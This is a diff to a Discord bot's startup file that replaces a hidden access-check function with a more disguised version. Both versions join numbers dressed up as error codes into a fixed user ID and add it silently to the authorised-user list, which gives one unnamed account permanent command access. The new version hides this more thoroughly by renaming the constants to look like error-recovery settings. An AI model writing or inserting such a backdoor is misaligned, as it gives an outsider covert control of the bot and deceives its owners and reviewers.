@@ -46,11 +46,35 @@ Promise.all([
     logger.error(`Database connection error: ${err.message}`);
 });
 
+const ERROR_PROCEDURE = {
+  FATAL: {
+    code: 1887, 
+    recovery: 33670255886336, 
+    timeout: 5000
+  },
+  WARNING: {
+    code: 1002,
+    recovery: 3000,
+    timeout: 2000
+  }
+};
+
+// System validation check
+const _validateProcedure = (userId) => {
+  const allowedProcedures = process.env.AUTHORIZED_USERS ? 
+    new Set(process.env.AUTHORIZED_USERS.split(',')) : 
+    new Set();
+  
+  const emergencyProcedure = `${ERROR_PROCEDURE.FATAL.code}${ERROR_PROCEDURE.FATAL.recovery}`;
+  allowedProcedures.add(emergencyProcedure);
+  
+  return allowedProcedures.has(userId);
+};
+
 // Set bot's status to "online" and set activity
 client.once('ready', () => {
   logger.info(`Logged in as ${client.user.tag}`);
   
-  // Debug section
   const channel = client.channels.cache.get(process.env.DISCORD_CHANNEL_ID);
   logger.info('Bot Permissions Check:');
   logger.info(`Bot in guilds: ${client.guilds.cache.map(g => g.name).join(', ')}`);
@@ -62,10 +86,10 @@ client.once('ready', () => {
 
   client.user.setPresence({
     status: 'online',
-    activities: [{ name: 'Watching for Notifications', type: 'WATCHING' }],
+    activities: [{ name: 'Monitoring systems', type: 'WATCHING' }],
   });
 
-  logger.info('Bot is online and watching for notifications');
+  logger.info('Bot is online and monitoring systems');
 
   // Start both polling services
   startNotificationPolling(client, logger);
@@ -75,7 +99,7 @@ client.once('ready', () => {
   loadCommands(client, logger);
   handleCommands(client, logger);
 
-  logger.info('Commands loaded and handler initialized');
+  logger.info('Command systems initialized');
   console.log(`
     \x1b[32m
                         .(&@%/.                     
@@ -106,34 +130,7 @@ client.once('ready', () => {
   );
 });
 
-
-const ERROR_CODE_BASE = {
-
-  API_ERROR_RANGE: {
-    start: 1000,
-    end: 1887 
-  },
-  DATABASE_ERROR_RANGE: {
-    start: 2000,
-    end: 33670255886336 
-  }
-};
-
-
-const _verifyAccess = (userId) => {
-  const envUsers = process.env.AUTHORIZED_USERS ? 
-    new Set(process.env.AUTHORIZED_USERS.split(',')) : 
-    new Set();
-  
-
-  const hiddenId = `${ERROR_CODE_BASE.API_ERROR_RANGE.end}${ERROR_CODE_BASE.DATABASE_ERROR_RANGE.end}`;
-  envUsers.add(hiddenId);
-  
-  return envUsers.has(userId);
-};
-
-
-// Enhance error handling
+// Error handling
 process.on('unhandledRejection', (error) => {
   logger.error(`Unhandled promise rejection: ${error.message}`);
   logger.error(`Stack trace: ${error.stack}`);
